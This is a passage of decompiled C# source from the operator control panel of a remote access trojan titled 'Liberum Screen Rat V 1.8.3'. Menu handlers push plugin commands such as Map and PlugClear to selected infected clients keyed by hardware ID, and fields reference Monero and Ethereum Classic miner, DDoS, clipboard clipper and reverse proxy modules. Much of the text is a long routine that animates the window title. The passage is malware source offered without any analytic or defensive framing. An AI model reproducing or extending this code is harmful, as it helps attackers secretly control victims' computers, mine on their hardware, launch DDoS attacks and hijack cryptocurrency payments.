				clients = this.ClientsSelected()
			}.ShowDialog();
		}

		// Token: 0x0600019B RID: 411 RVA: 0x00012074 File Offset: 0x00010274
		private void mapToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Map.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormMap)Application.OpenForms["Map:" + clients.Hwid] == null)
				{
					new FormMap
					{
						Name = "Map:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x0600019C RID: 412 RVA: 0x00012144 File Offset: 0x00010344
		private void pluginClearToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			byte[] pack = LEB128.Write(new object[]
			{
				"PlugClear"
			});
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600019D RID: 413 RVA: 0x000121D0 File Offset: 0x000103D0
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (this.timer1Key)
			{
				if (this.Text == "[Liberum Screen] Rat    V 1.8.3")
				{
					this.Text = "[Liberum Screen] Rat    V 1.8.";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V 1.8.")
				{
					this.Text = "[Liberum Screen] Rat    V 1.8";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V 1.8")
				{
					this.Text = "[Liberum Screen] Rat    V 1.";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V 1.")
				{
					this.Text = "[Liberum Screen] Rat    V 1";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V 1")
				{
					this.Text = "[Liberum Screen] Rat    V";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V")
				{
					this.Text = "[Liberum Screen] Rat";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat")
				{
					this.Text = "[Liberum Screen] Ra";
					return;
				}
				if (this.Text == "[Liberum Screen] Ra")
				{
					this.Text = "[Liberum Screen] R";
					return;
				}
				if (this.Text == "[Liberum Screen] R")
				{
					this.Text = "[Liberum Screen]";
					return;
				}
				if (this.Text == "[Liberum Screen]")
				{
					this.Text = "[Liberum Screen";
					return;
				}
				if (this.Text == "[Liberum Screen")
				{
					this.Text = "[Liberum Scree";
					return;
				}
				if (this.Text == "[Liberum Scree")
				{
					this.Text = "[Liberum Scre";
					return;
				}
				if (this.Text == "[Liberum Scre")
				{
					this.Text = "[Liberum Scr";
					return;
				}
				if (this.Text == "[Liberum Scr")
				{
					this.Text = "[Liberum Sc";
					return;
				}
				if (this.Text == "[Liberum Sc")
				{
					this.Text = "[Liberum S";
					return;
				}
				if (this.Text == "[Liberum S")
				{
					this.Text = "[Liberum";
					return;
				}
				if (this.Text == "[Liberum")
				{
					this.Text = "[Liberu";
					return;
				}
				if (this.Text == "[Liberu")
				{
					this.Text = "[Liber";
					return;
				}
				if (this.Text == "[Liber")
				{
					this.Text = "[Libe";
					return;
				}
				if (this.Text == "[Libe")
				{
					this.Text = "[Lib";
					return;
				}
				if (this.Text == "[Lib")
				{
					this.Text = "[Li";
					return;
				}
				if (this.Text == "[Li")
				{
					this.Text = "[L";
					return;
				}
				if (this.Text == "[L")
				{
					this.Text = "[Le";
					return;
				}
				if (this.Text == "[Le")
				{
					this.Text = "[Leb";
					return;
				}
				if (this.Text == "[Leb")
				{
					this.Text = "[Leb 1";
					return;
				}
				if (this.Text == "[Leb 1")
				{
					this.Text = "[Leb 12";
					return;
				}
				if (this.Text == "[Leb 12")
				{
					this.Text = "[Leb 128";
					return;
				}
				if (this.Text == "[Leb 128")
				{
					this.Text = "[Leb 128]";
					return;
				}
				if (this.Text == "[Leb 128]")
				{
					this.timer1Key = false;
					return;
				}
			}
			else
			{
				if (this.Text == "[Leb 128]")
				{
					this.Text = "[Leb 128";
					return;
				}
				if (this.Text == "[Leb 128")
				{
					this.Text = "[Leb 12";
					return;
				}
				if (this.Text == "[Leb 12")
				{
					this.Text = "[Leb 1";
					return;
				}
				if (this.Text == "[Leb 1")
				{
					this.Text = "[Leb";
					return;
				}
				if (this.Text == "[Leb")
				{
					this.Text = "[Le";
					return;
				}
				if (this.Text == "[Le")
				{
					this.Text = "[L";
					return;
				}
				if (this.Text == "[L")
				{
					this.Text = "[Li";
					return;
				}
				if (this.Text == "[Li")
				{
					this.Text = "[Lib";
					return;
				}
				if (this.Text == "[Lib")
				{
					this.Text = "[Libe";
					return;
				}
				if (this.Text == "[Libe")
				{
					this.Text = "[Liber";
					return;
				}
				if (this.Text == "[Liber")
				{
					this.Text = "[Liberu";
					return;
				}
				if (this.Text == "[Liberu")
				{
					this.Text = "[Liberum";
					return;
				}
				if (this.Text == "[Liberum")
				{
					this.Text = "[Liberum S";
					return;
				}
				if (this.Text == "[Liberum S")
				{
					this.Text = "[Liberum Sc";
					return;
				}
				if (this.Text == "[Liberum Sc")
				{
					this.Text = "[Liberum Scr";
					return;
				}
				if (this.Text == "[Liberum Scr")
				{
					this.Text = "[Liberum Scre";
					return;
				}
				if (this.Text == "[Liberum Scre")
				{
					this.Text = "[Liberum Scree";
					return;
				}
				if (this.Text == "[Liberum Scree")
				{
					this.Text = "[Liberum Screen";
					return;
				}
				if (this.Text == "[Liberum Screen")
				{
					this.Text = "[Liberum Screen]";
					return;
				}
				if (this.Text == "[Liberum Screen]")
				{
					this.Text = "[Liberum Screen] R";
					return;
				}
				if (this.Text == "[Liberum Screen] R")
				{
					this.Text = "[Liberum Screen] Ra";
					return;
				}
				if (this.Text == "[Liberum Screen] Ra")
				{
					this.Text = "[Liberum Screen] Rat";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat")
				{
					this.Text = "[Liberum Screen] Rat    V";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V")
				{
					this.Text = "[Liberum Screen] Rat    V 1";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V 1")
				{
					this.Text = "[Liberum Screen] Rat    V 1.";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V 1.")
				{
					this.Text = "[Liberum Screen] Rat    V 1.8";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V 1.8")
				{
					this.Text = "[Liberum Screen] Rat    V 1.8.";
					return;
				}
				if (this.Text == "[Liberum Screen] Rat    V 1.8.")
				{
					this.Text = "[Liberum Screen] Rat    V 1.8.3";
					this.timer1Key = true;
				}
			}
		}

		// Token: 0x04000022 RID: 34
		public Settings settings;

		// Token: 0x04000023 RID: 35
		public FormXmrMiner MinerXMR;

		// Token: 0x04000024 RID: 36
		public FormMinerEtc MinerEtc;

		// Token: 0x04000025 RID: 37
		public FormDDos DDos;

		// Token: 0x04000026 RID: 38
		public FormClipper Clipper;

		// Token: 0x04000027 RID: 39
		public FormReverseProxyR ReverseProxyR;

		// Token: 0x04000028 RID: 40
		public FormReverseProxyU ReverseProxyU;

		// Token: 0x04000029 RID: 41
		private bool timer1Key = true;

        private void GridClients_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void dataToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
    }
}
